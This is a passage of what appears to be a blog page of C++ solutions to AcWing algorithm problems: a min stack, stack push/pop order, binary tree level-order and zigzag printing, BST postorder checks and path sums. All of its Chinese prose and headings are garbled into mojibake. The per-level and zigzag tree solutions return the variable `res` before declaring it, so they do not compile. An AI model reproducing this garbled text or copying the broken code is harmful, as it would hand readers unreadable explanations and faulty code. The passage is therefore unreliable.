class="built_in">push</span>(x);</span><br><span class="line">    <span class="comment">// å½“ x = min_stk.top() æ—¶ä¹Ÿåº”å½“pushè¿›min_stk</span></span><br><span class="line">    <span class="keyword">if</span> (min_stk.<span class="built_in">empty</span>() || x &lt;= min_stk.<span class="built_in">top</span>()) min_stk.<span class="built_in">push</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stk.<span class="built_in">top</span>() == min_stk.<span class="built_in">top</span>()) min_stk.<span class="built_in">pop</span>();</span><br><span class="line">    stk.<span class="built_in">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> stk.<span class="built_in">top</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> min_stk.<span class="built_in">top</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MinStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MinStack obj = new MinStack();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.top();</span></span><br><span class="line"><span class="comment"> * int param_4 = obj.getMin();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—â˜…"><a href="https://www.acwing.com/problem/content/40/">æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—â˜…</a></h2><p>è¾“å…¥ä¸¤ä¸ªæ•´æ•°åºåˆ—ï¼Œç¬¬ä¸€ä¸ªåºåˆ—è¡¨ç¤ºæ ˆçš„å‹å…¥é¡ºåºï¼Œè¯·åˆ¤æ–­ç¬¬äºŒä¸ªåºåˆ—æ˜¯å¦å¯èƒ½ä¸ºè¯¥æ ˆçš„å¼¹å‡ºé¡ºåºã€‚</p><p>å‡è®¾å‹å…¥æ ˆçš„æ‰€æœ‰æ•°å­—å‡ä¸ç›¸ç­‰ã€‚</p><p>ä¾‹å¦‚åºåˆ— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1,2,3,4,5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span></span></span></span> æ˜¯æŸæ ˆçš„å‹å…¥é¡ºåºï¼Œåºåˆ— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">4,5,3,2,1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span></span></span></span> æ˜¯è¯¥å‹æ ˆåºåˆ—å¯¹åº”çš„ä¸€ä¸ªå¼¹å‡ºåºåˆ—ï¼Œä½† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">4,3,5,1,2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span></span></span></span> å°±ä¸å¯èƒ½æ˜¯è¯¥å‹æ ˆåºåˆ—çš„å¼¹å‡ºåºåˆ—ã€‚</p><p><strong>æ³¨æ„</strong>ï¼šè‹¥ä¸¤ä¸ªåºåˆ—é•¿åº¦ä¸ç­‰åˆ™è§†ä¸ºå¹¶ä¸æ˜¯ä¸€ä¸ªæ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—ã€‚è‹¥ä¸¤ä¸ªåºåˆ—éƒ½ä¸ºç©ºï¼Œåˆ™è§†ä¸ºæ˜¯ä¸€ä¸ªæ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>åºåˆ—é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1,2,3,4,5]      [4,5,3,2,1]è¾“å‡ºï¼štrue</code></pre><h3 id="æ¨¡æ‹Ÿæ³•-2">æ¨¡æ‹Ÿæ³•</h3><p>æ ˆåªæœ‰push()å’Œpop()ä¸¤ä¸ªæ“ä½œä¼šå½±å“æ ˆä¸­çš„æ•°æ®</p><p>è‹¥æ ˆé¡¶å…ƒç´  = å¼¹å‡ºåºåˆ—é¦–éƒ¨, åˆ™å¿…ç„¶å¯¹åº”pop(); å¦åˆ™, åˆ™å¿…ç„¶è¦å°†æ•°æ®pushè¿›å»</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isPopOrder</span><span class="params">(vector&lt;<span class="type">int</span>&gt; pushV,vector&lt;<span class="type">int</span>&gt; popV)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pushV.<span class="built_in">size</span>() != popV.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: pushV) &#123;</span><br><span class="line">      stk.<span class="built_in">push</span>(x);</span><br><span class="line">      <span class="keyword">while</span> (stk.<span class="built_in">size</span>() &amp;&amp; stk.<span class="built_in">top</span>() == popV[index]) &#123;</span><br><span class="line">        stk.<span class="built_in">pop</span>();</span><br><span class="line">        index++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stk.<span class="built_in">empty</span>()? <span class="literal">true</span>: <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ä¸åˆ†è¡Œä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘"><a href="https://www.acwing.com/problem/content/41/">ä¸åˆ†è¡Œä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘</a></h2><p>ä»ä¸Šå¾€ä¸‹æ‰“å°å‡ºäºŒå‰æ ‘çš„æ¯ä¸ªç»“ç‚¹ï¼ŒåŒä¸€å±‚çš„ç»“ç‚¹æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹çš„æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥å¦‚ä¸‹å›¾æ‰€ç¤ºäºŒå‰æ ‘[8, 12, 2, null, null, 6, null, 4, null, null, null]    8   / \  12  2     /    6   /  4è¾“å‡ºï¼š[8, 12, 2, 6, 4]</code></pre><h3 id="BFS">BFS</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">printFromTopToBottom</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> res;</span><br><span class="line">    </span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">      q.<span class="built_in">pop</span>();</span><br><span class="line">      res.<span class="built_in">push_back</span>(t-&gt;val);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (t-&gt;left) q.<span class="built_in">push</span>(t-&gt;left);</span><br><span class="line">      <span class="keyword">if</span> (t-&gt;right) q.<span class="built_in">push</span>(t-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="åˆ†è¡Œä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘â˜…"><a href="https://www.acwing.com/problem/content/42/">åˆ†è¡Œä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘â˜…</a></h2><p>ä»ä¸Šåˆ°ä¸‹æŒ‰å±‚æ‰“å°äºŒå‰æ ‘ï¼ŒåŒä¸€å±‚çš„ç»“ç‚¹æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œæ¯ä¸€å±‚æ‰“å°åˆ°ä¸€è¡Œã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹çš„æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥å¦‚ä¸‹å›¾æ‰€ç¤ºäºŒå‰æ ‘[8, 12, 2, null, null, 6, null, 4, null, null, null]    8   / \  12  2     /    6   /  4è¾“å‡ºï¼š[[8], [12, 2], [6], [4]]</code></pre><h3 id="BFS-æ¯å±‚æ”¾null">BFS + æ¯å±‚æ”¾null</h3><p>åœ¨æ¯å±‚ç»“æŸå¤„åŠ ä¸Šnullæ ‡å¿—, è¯»åˆ°nullæ—¶æ„å‘³è¯¥å±‚ç»“æŸ, å°†è¯¥å±‚ç»“æœä¿å­˜, å¹¶ä¸”<strong>æ­¤æ—¶ä¸‹ä¸€å±‚èŠ‚ç‚¹å·²å…¨å…¥é˜Ÿ</strong>, åº”æ­¤å†å…¥é˜Ÿä¸‹ä¸€å±‚æ ‡å¿—null</p><p>å¦‚æœä¸æ˜¯nullå°±å°†å½“å‰èŠ‚ç‚¹å€¼æ”¾å…¥level, å¹¶ä¸”å·¦å³å­æ ‘è‹¥å­˜åˆ™å…¥é˜Ÿ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">printFromTopToBottom</span>(TreeNode* root) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> res;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; level;</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">      q.<span class="built_in">pop</span>();</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (t) &#123;</span><br><span class="line">        level.<span class="built_in">push_back</span>(t-&gt;val);</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;left) q.<span class="built_in">push</span>(t-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;right) q.<span class="built_in">push</span>(t-&gt;right);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (q.<span class="built_in">size</span>()) q.<span class="built_in">push</span>(<span class="literal">nullptr</span>);</span><br><span class="line">        res.<span class="built_in">push_back</span>(level);</span><br><span class="line">        level.<span class="built_in">clear</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ä¹‹å­—å½¢æ‰“å°äºŒå‰æ ‘â˜…"><a href="https://www.acwing.com/problem/content/43/">ä¹‹å­—å½¢æ‰“å°äºŒå‰æ ‘â˜…</a></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°æŒ‰ç…§ä¹‹å­—å½¢é¡ºåºä»ä¸Šå‘ä¸‹æ‰“å°äºŒå‰æ ‘ã€‚</p><p>å³ç¬¬ä¸€è¡ŒæŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œç¬¬äºŒå±‚æŒ‰ç…§ä»å³åˆ°å·¦çš„é¡ºåºæ‰“å°ï¼Œç¬¬ä¸‰è¡Œå†æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œå…¶ä»–è¡Œä»¥æ­¤ç±»æ¨ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹çš„æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥å¦‚ä¸‹å›¾æ‰€ç¤ºäºŒå‰æ ‘[8, 12, 2, null, null, 6, 4, null, null, null, null]    8   / \  12  2     / \    6   4è¾“å‡ºï¼š[[8], [2, 12], [6, 4]]</code></pre><h3 id="BFS-æ¯å±‚è¡¥å……null-flagç¿»è½¬æ¯å±‚ç»“æœ">BFS + æ¯å±‚è¡¥å……null + flagç¿»è½¬æ¯å±‚ç»“æœ</h3><blockquote><p>åœ¨å°†levelå‹å…¥åˆ°reså‰ï¼Œè¿›è¡Œ<code>reverse(level.begin(), level.end())</code>æ˜¯æœ€ä¾¿æ·çš„ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">printFromTopToBottom</span>(TreeNode* root) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> res;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">    </span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; level;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">      q.<span class="built_in">pop</span>();</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (t) &#123;</span><br><span class="line">        level.<span class="built_in">push_back</span>(t-&gt;val);</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;left) q.<span class="built_in">push</span>(t-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;right) q.<span class="built_in">push</span>(t-&gt;right);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (q.<span class="built_in">size</span>()) q.<span class="built_in">push</span>(<span class="literal">nullptr</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag) <span class="built_in">reverse</span>(level.<span class="built_in">begin</span>(), level.<span class="built_in">end</span>());</span><br><span class="line">        flag = !flag;</span><br><span class="line">        res.<span class="built_in">push_back</span>(level);</span><br><span class="line">        level.<span class="built_in">clear</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Week-4">Week 4</h1><h2 id="äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—"><a href="https://www.acwing.com/problem/content/44/">äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—</a></h2><p>è¾“å…¥ä¸€ä¸ªæ•´æ•°æ•°ç»„ï¼Œåˆ¤æ–­è¯¥æ•°ç»„æ˜¯ä¸æ˜¯æŸäºŒå‰æœç´¢æ ‘çš„ååºéå†çš„ç»“æœã€‚</p><p>å¦‚æœæ˜¯åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚</p><p>å‡è®¾è¾“å…¥çš„æ•°ç»„çš„ä»»æ„ä¸¤ä¸ªæ•°å­—éƒ½äº’ä¸ç›¸åŒã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[4, 8, 6, 12, 16, 14, 10]è¾“å‡ºï¼štrue</code></pre><h3 id="é€’å½’æ³•-4">é€’å½’æ³•</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; seq_;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">verifySequenceOfBST</span><span class="params">(vector&lt;<span class="type">int</span>&gt; sequence)</span> </span>&#123;</span><br><span class="line">    seq_ = sequence;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(<span class="number">0</span>, seq_.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> k = l;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; r &amp;&amp; seq_[k] &lt; seq_[r]) k++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; r; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (seq_[i] &lt;= seq_[r]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(l, k - <span class="number">1</span>) &amp;&amp; <span class="built_in">dfs</span>(k, r - <span class="number">1</span>);  <span class="comment">// kæ˜¯å³å­æ ‘èµ·ç‚¹</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„â˜…"><a href="https://www.acwing.com/problem/content/45/">äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„â˜…</a></h2><p>è¾“å…¥ä¸€æ£µäºŒå‰æ ‘å’Œä¸€ä¸ªæ•´æ•°ï¼Œæ‰“å°å‡ºäºŒå‰æ ‘ä¸­ç»“ç‚¹å€¼çš„å’Œä¸ºè¾“å…¥æ•´æ•°çš„æ‰€æœ‰è·¯å¾„ã€‚</p><p>ä»æ ‘çš„æ ¹ç»“ç‚¹å¼€å§‹å¾€ä¸‹ä¸€ç›´åˆ°å¶ç»“ç‚¹æ‰€ç»è¿‡çš„ç»“ç‚¹å½¢æˆä¸€æ¡è·¯å¾„ã€‚</p><p>ä¿è¯æ ‘ä¸­ç»“ç‚¹å€¼å‡ä¸å°äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­ç»“ç‚¹çš„æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>ç»™å‡ºäºŒå‰æ ‘å¦‚ä¸‹æ‰€ç¤ºï¼Œå¹¶ç»™å‡ºnum=22ã€‚      5     / \    4   6   /   / \  12  13  6 /  \    / \9    1  5   1è¾“å‡ºï¼š[[5,4,12,1],[5,6,6,5]]</code></pre><h3 id="é€’å½’æ³•-5">é€’å½’æ³•</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 